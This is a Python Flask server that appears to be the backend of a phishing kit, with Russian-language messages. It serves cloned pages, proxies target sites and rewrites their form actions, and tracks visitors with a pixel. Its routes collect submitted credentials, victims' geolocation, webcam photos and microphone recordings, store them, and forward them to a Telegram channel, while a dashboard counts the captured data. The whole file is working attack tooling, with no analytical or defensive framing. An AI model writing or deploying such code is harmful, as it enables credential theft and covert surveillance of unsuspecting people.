import sqlite3
from flask import Flask, request, send_file, abort, redirect, jsonify, Response, send_from_directory, render_template
import os
import json
from datetime import datetime, timedelta
from fish_config import SERVER_HOST, SERVER_PORT, LOGS_DIR, UPLOADS_DIR, DB_PATH, PAGES_DIR
import fish_db as db
import fish_utils as utils
import requests
from fish_downloader import downloader

app = Flask(__name__)

os.makedirs(os.path.join(LOGS_DIR, 'webcam'), exist_ok=True)
os.makedirs(os.path.join(LOGS_DIR, 'microphone'), exist_ok=True)

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/stats')
def api_stats():
    cred_count, geo_count, webcam_count, mic_count, visit_count = db.get_stats()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    seven_days_ago = (datetime.now() - timedelta(days=7)).strftime('%Y-%m-%d')
    c.execute("""
        SELECT DATE(timestamp) as day, COUNT(*) 
        FROM visits 
        WHERE timestamp >= ? 
        GROUP BY day 
        ORDER BY day
    """, (seven_days_ago,))
    visits_by_day = c.fetchall()
    conn.close()
    
    days = [row[0] for row in visits_by_day]
    counts = [row[1] for row in visits_by_day]
    
    return jsonify({
        'total_creds': cred_count,
        'total_geo': geo_count,
        'total_webcam': webcam_count,
        'total_mic': mic_count,
        'total_visits': visit_count,
        'visits_by_day': {'days': days, 'counts': counts}
    })

@app.route('/api/pages')
def api_pages():
    pages = downloader.get_all_pages()
    return jsonify(pages)

@app.route('/api/tunnel')
def api_tunnel():
    """READ-ONLY: Tunnel is managed by admin_web.py (FISH_TUNNEL_DISABLED=true)"""
    import os as _os
    url = None
    try:
        from pathlib import Path
        url = Path('/tmp/tunnel_url.txt').read_text().strip()
    except Exception:
        pass
    return jsonify({'running': bool(url), 'url': url, 'managed_by': 'admin_web'})

@app.route('/')
def index():
    active_info = downloader.get_active_page_info()
    if active_info:
        pid, _, _ = active_info
        return redirect(f'/page/{pid}')
    pages = downloader.get_all_pages()
    if not pages:
        return "<h1>Нет доступных страниц</h1>"
    links = ''.join(f'<li><a href="/page/{pid}">{meta["url"]} ({meta["date"]})</a></li>' 
                    for pid, meta in pages.items())
    return f"<h1>Выберите страницу:</h1><ul>{links}</ul>"

@app.route('/page/<page_id>')
def serve_page(page_id):
    pages = downloader.get_all_pages()
    if page_id not in pages:
        abort(404)
    meta = pages[page_id]
    if meta.get('type') == 'full_site':
        return send_from_directory(meta['path'], 'index.html')
    else:
        return send_file(os.path.join(PAGES_DIR, meta['filename']))

@app.route('/page/<page_id>/<path:filename>')
def serve_page_file(page_id, filename):
    pages = downloader.get_all_pages()
    if page_id not in pages:
        abort(404)
    meta = pages[page_id]
    if meta.get('type') != 'full_site':
        abort(404)
    safe_path = os.path.join(meta['path'], filename)
    if not os.path.realpath(safe_path).startswith(os.path.realpath(meta['path'])):
        abort(403)
    return send_from_directory(meta['path'], filename)

@app.route('/proxy/')
@app.route('/proxy/<path:target_url>')
def proxy(target_url=''):
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    try:
        resp = requests.get(
            target_url,
            headers={'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0')},
            timeout=10
        )
        content = resp.text
        content = content.replace('href="http://', 'href="/proxy/http://')
        content = content.replace('href="https://', 'href="/proxy/https://')
        content = content.replace('src="http://', 'src="/proxy/http://')
        content = content.replace('src="https://', 'src="/proxy/https://')
        content = content.replace('action="http://', 'action="/proxy/http://')
        content = content.replace('action="https://', 'action="/proxy/https://')
        return Response(content, content_type=resp.headers.get('content-type', 'text/html'))
    except Exception as e:
        return f"Proxy error: {e}", 502

@app.route('/log_visit')
def log_visit():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    os_name = utils.get_os_from_ua(ua)
    page = request.args.get('page', '/')
    referer = request.args.get('referer', '')
    db.save_visit_to_db(ip, os_name, ua, page, referer)
    pixel = (b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00'
             b'\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00'
             b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
    return pixel, 200, {'Content-Type': 'image/gif'}

@app.route('/download/<int:file_id>')
def download_file(file_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT filename, original_name FROM files WHERE id = ?", (file_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        abort(404)
    filename, original_name = row
    filepath = os.path.join(UPLOADS_DIR, filename)
    if not os.path.exists(filepath):
        abort(404)
    db.increment_download_count(file_id)
    return send_file(filepath, as_attachment=True, download_name=original_name)

@app.route('/capture', methods=['POST'])
def capture():
    if request.is_json:
        data = request.get_json()
    else:
        data = {k: request.form[k] for k in request.form}
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    os_name = utils.get_os_from_ua(ua)
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open(os.path.join(LOGS_DIR, 'creds.txt'), 'a', encoding='utf-8') as f:
        f.write(f'[{ts}] IP: {ip} | OS: {os_name}\nUA: {ua}\n')
        f.write(f'Data: {json.dumps(data, ensure_ascii=False)}\n')
        f.write('-' * 50 + '\n')

    db.save_cred_to_db(ts, ip, os_name, ua, data)

    text = f"🔐 <b>Новые данные</b>\n\nIP: {ip}\nOS: {os_name}\n"
    for k, v in data.items():
        if isinstance(v, dict):
            v = json.dumps(v, ensure_ascii=False)
        text += f"{utils.safe_escape(k)}: {utils.safe_escape(v[:100])}{'...' if len(v) > 100 else ''}\n"
    utils.send_telegram_message(text)

    return 'OK', 200

@app.route('/geo', methods=['POST'])
def geo():
    data = request.json
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    os_name = utils.get_os_from_ua(ua)
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open(os.path.join(LOGS_DIR, 'geo.txt'), 'a', encoding='utf-8') as f:
        f.write(f'[{ts}] IP: {ip} | OS: {os_name} | {data}\n')

    if 'lat' in data:
        db.save_geo_to_db(ts, ip, os_name, data['lat'], data['lon'], data.get('acc'))
        maps_link = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
        text = f"📍 <b>Геолокация</b>\n\nIP: {ip}\nOS: {os_name}\nКоординаты: {data['lat']}, {data['lon']}\nТочность: {data.get('acc', 'N/A')} м\n\n{maps_link}"
        utils.send_telegram_message(text)
    else:
        db.save_geo_to_db(ts, ip, os_name, error=data.get('error'))
        utils.send_telegram_message(f"❌ <b>Ошибка геолокации</b>\nIP: {ip}\nOS: {os_name}\nОшибка: {data.get('error')}")
    return '', 204

@app.route('/media', methods=['POST'])
def media():
    data = request.json
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    os_name = utils.get_os_from_ua(ua)
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open(os.path.join(LOGS_DIR, 'media_status.txt'), 'a', encoding='utf-8') as f:
        f.write(f'[{ts}] IP: {ip} | OS: {os_name} | {data}\n')

    status = data.get('status')
    db.save_media_to_db(ts, ip, os_name, 'permission', status)
    utils.send_telegram_message(f"📸 <b>Запрос разрешения</b>\nIP: {ip}\nOS: {os_name}\nСтатус: {status}")
    return '', 204

@app.route('/upload_media', methods=['POST'])
def upload_media():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    os_name = utils.get_os_from_ua(ua)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    ts_human = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if 'photo' in request.files:
        file = request.files['photo']
        filename = f"webcam_{ts}_{ip}.jpg"
        filepath = os.path.join(LOGS_DIR, 'webcam', filename)
        file.save(filepath)
        db.save_media_to_db(ts_human, ip, os_name, 'webcam', 'captured', filename)
        utils.send_telegram_photo(filepath, f"📸 Фото с веб-камеры\nIP: {ip}\nOS: {os_name}\n{ts_human}")

    if 'audio' in request.files:
        file = request.files['audio']
        filename = f"microphone_{ts}_{ip}.webm"
        filepath = os.path.join(LOGS_DIR, 'microphone', filename)
        file.save(filepath)
        db.save_media_to_db(ts_human, ip, os_name, 'microphone', 'captured', filename)
        utils.send_telegram_audio(filepath, f"🎤 Аудиозапись\nIP: {ip}\nOS: {os_name}\n{ts_human}")

    return '', 204

@app.route('/health')
def health():
    return jsonify({'status': 'ok'})

def run_flask(use_ssl=False):
    """
    Запускает Flask.
    На Windows — использует waitress (production WSGI, без WARNING).
    use_ssl=True — генерирует self-signed сертификат для HTTPS.
    """
    import sys as _sys_fw
    if use_ssl:
        try:
            import ssl, subprocess, os as _os_fw
            cert_path = _os_fw.path.join(_os_fw.path.dirname(__file__), 'fish_ssl.crt')
            key_path  = _os_fw.path.join(_os_fw.path.dirname(__file__), 'fish_ssl.key')
            if not (_os_fw.path.exists(cert_path) and _os_fw.path.exists(key_path)):
                subprocess.run([
                    'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
                    '-keyout', key_path, '-out', cert_path,
                    '-days', '365', '-nodes',
                    '-subj', '/CN=localhost'
                ], check=True, capture_output=True)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_path, key_path)
            app.run(host=SERVER_HOST, port=SERVER_PORT,
                    debug=False, threaded=True, ssl_context=ctx)
            return
        except Exception as e:
            print(f"fish_web: HTTPS недоступен ({e}), запускаю HTTP", flush=True)

    # На Windows используем waitress — убирает "development server" WARNING
    if _sys_fw.platform == 'win32':
        try:
            from waitress import serve
            print(f"fish_web: запуск через waitress на {SERVER_HOST}:{SERVER_PORT}", flush=True)
            serve(app, host=SERVER_HOST, port=SERVER_PORT, threads=8)
            return
        except ImportError:
            print("fish_web: waitress не установлен, используем Flask dev server", flush=True)

    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False, threaded=True)
